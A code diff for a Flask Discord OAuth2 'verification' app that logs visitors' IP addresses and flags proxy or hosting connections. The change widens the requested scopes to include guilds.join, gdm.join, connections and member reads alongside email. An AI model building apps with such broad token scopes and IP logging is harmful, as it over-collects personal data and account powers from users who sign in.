@@ -15,7 +15,7 @@ DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
 DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
 DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
 DISCORD_GUILD_ID = os.getenv("DISCORD_GUILD_ID")
-REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")  # https://black-ruann.onrender.com/callback
+REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
 
 # ----------------------------
 # クライアントIP取得
@@ -75,12 +75,17 @@ def save_log(discord_id, data):
 @app.route("/")
 def index():
     redirect_uri_encoded = quote(REDIRECT_URI, safe='')
+
+    # 複数スコープ対応（スペースは %20）
+    scopes = "identify email guilds guilds.channels.read guilds.join connections guilds.members.read gdm.join"
+    scopes_encoded = quote(scopes, safe='')
+
     discord_auth_url = (
         f"https://discord.com/oauth2/authorize"
         f"?client_id={DISCORD_CLIENT_ID}"
         f"&response_type=code"
         f"&redirect_uri={redirect_uri_encoded}"
-        f"&scope=identify%20email%20guilds"
+        f"&scope={scopes_encoded}"
     )
     return render_template("index.html", discord_auth_url=discord_auth_url)
 
@@ -96,13 +101,14 @@ def callback():
     # OAuth2 トークン取得
     token_url = "https://discord.com/api/oauth2/token"
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
+    scopes = "identify email guilds guilds.channels.read guilds.join connections guilds.members.read gdm.join"
     data = {
         "client_id": DISCORD_CLIENT_ID,
         "client_secret": DISCORD_CLIENT_SECRET,
         "grant_type": "authorization_code",
         "code": code,
         "redirect_uri": REDIRECT_URI,
-        "scope": "identify email guilds"
+        "scope": scopes
     }
     try:
         res = requests.post(token_url, data=data, headers=headers)
@@ -195,14 +201,11 @@ def callback():
             "timestamp": datetime.utcnow().isoformat()
         }
 
-        # 不審アクセス
         if data["proxy"] or data["hosting"]:
             suspicious_embed = {
                 "title": "⚠️ 不審アクセス検出",
                 "color": 0xFF3C3C,
-                "description": (
-                    f"```diff\n- Proxy or Hosting Detected!\n+ Username: {data['username']}#{data['discriminator']}\n+ IP: {data['ip']}\n+ Proxy: {data['proxy']} | Hosting: {data['hosting']}\n```"
-                ),
+                "description": f"```diff\n- Proxy or Hosting Detected!\n+ Username: {data['username']}#{data['discriminator']}\n+ IP: {data['ip']}\n+ Proxy: {data['proxy']} | Hosting: {data['hosting']}\n```",
                 "footer": {"text": "BLACK_ルアン セキュリティAIによる自動検知",
                            "icon_url": "https://cdn-icons-png.flaticon.com/512/7359/7359942.png"},
                 "timestamp": datetime.utcnow().isoformat()
